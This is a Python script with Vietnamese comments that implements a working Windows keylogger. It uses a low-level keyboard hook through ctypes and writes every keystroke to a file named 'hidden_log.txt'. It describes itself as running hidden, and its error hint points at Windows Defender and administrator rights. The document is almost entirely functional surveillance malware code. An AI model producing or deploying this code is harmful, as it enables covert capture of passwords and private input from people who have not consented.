import ctypes
from ctypes import wintypes
import sys
import time
# Khai báo các thư viện lõi của Windows
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
PM_REMOVE = 1
# =====================================================================
# KHẮC PHỤC LỖI TRÊN WINDOWS 64-BIT (ARM64)
# Định nghĩa rõ kiểu dữ liệu để tránh bị OS cắt xén con trỏ (Pointer Truncation)
# =====================================================================
user32.SetWindowsHookExW.argtypes = [ctypes.c_int, ctypes.c_void_p, wintypes.HINSTANCE, wintypes.DWORD]
user32.SetWindowsHookExW.restype = wintypes.HHOOK

user32.UnhookWindowsHookEx.argtypes = [wintypes.HHOOK]
user32.UnhookWindowsHookEx.restype = wintypes.BOOL

user32.CallNextHookEx.argtypes = [wintypes.HHOOK, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM]
user32.CallNextHookEx.restype = wintypes.LPARAM

kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
kernel32.GetModuleHandleW.restype = wintypes.HINSTANCE

# Các hằng số cấu hình Hook
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
LOG_FILE = "hidden_log.txt"

# Cấu trúc dữ liệu chứa thông tin phím bấm
class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [("vkCode", wintypes.DWORD),
                ("scanCode", wintypes.DWORD),
                ("flags", wintypes.DWORD),
                ("time", wintypes.DWORD),
                ("dwExtraInfo", ctypes.POINTER(wintypes.ULONG))]

# Sử dụng wintypes.LPARAM thay cho c_long để tương thích an toàn với 64-bit
HOOKPROC = ctypes.WINFUNCTYPE(wintypes.LPARAM, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)

hook_id = None

# Hàm Callback: Nơi đánh chặn dữ liệu
def hook_callback(nCode, wParam, lParam):
   if nCode >= 0 and wParam == WM_KEYDOWN:
      kbd_struct = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
      vk_code = kbd_struct.vkCode
      
      char = chr(vk_code) if 32 <= vk_code <= 126 else f"[{vk_code}]"
      
      with open(LOG_FILE, "a", encoding="utf-8") as f:
         f.write(char)
         
   return user32.CallNextHookEx(hook_id, nCode, wParam, lParam)

c_callback = HOOKPROC(hook_callback)

def main():
   global hook_id
   
   # 1. Lấy Handle của tiến trình hiện tại (Python.exe)
   h_mod = kernel32.GetModuleHandleW(None)
   
   # 2. Chuyển hàm Python thành con trỏ C hợp lệ
   hook_pointer = ctypes.cast(c_callback, ctypes.c_void_p)
   
   # 3. Đăng ký Hook
   hook_id = user32.SetWindowsHookExW(
      WH_KEYBOARD_LL,
      hook_pointer,
      h_mod,
      0 
   )

   if not hook_id:
      # Lấy mã lỗi lõi của Windows để phân tích
      error_code = ctypes.GetLastError()
      print(f"Lỗi: Không thể thiết lập Hook.")
      print(f"Mã lỗi Windows (Error Code): {error_code}")
      print("Gợi ý: Nếu mã lỗi là 5 (Access Denied) hoặc 126, hãy kiểm tra lại Windows Defender và chạy CMD bằng quyền Administrator.")
      sys.exit(1)

   print("Keylogger đang chạy ngầm... (Nhấn Ctrl+C trong terminal để thoát)")

   msg = wintypes.MSG()
   try:
      # 2. THAY VÒNG LẶP GETMESSAGE BẰNG PEEKMESSAGE
      while True:
         # Nhìn trộm xem có thông điệp nào không
         if user32.PeekMessageW(ctypes.byref(msg), None, 0, 0, PM_REMOVE):
               user32.TranslateMessage(ctypes.byref(msg))
               user32.DispatchMessageW(ctypes.byref(msg))
         else:
               # 3. YIELD TÀI NGUYÊN: Nghỉ 10 mili-giây để Python kịp bắt lệnh Ctrl+C
               time.sleep(0.01) 
                  
   except KeyboardInterrupt:
      print("\n[!] Đã nhận lệnh dừng từ người dùng (Ctrl+C).")
      
   finally:
      if hook_id:
         user32.UnhookWindowsHookEx(hook_id)
         print("[*] Đã gỡ bỏ Hook an toàn và giải phóng bộ nhớ. Chương trình kết thúc.")

if __name__ == "__main__":
    main()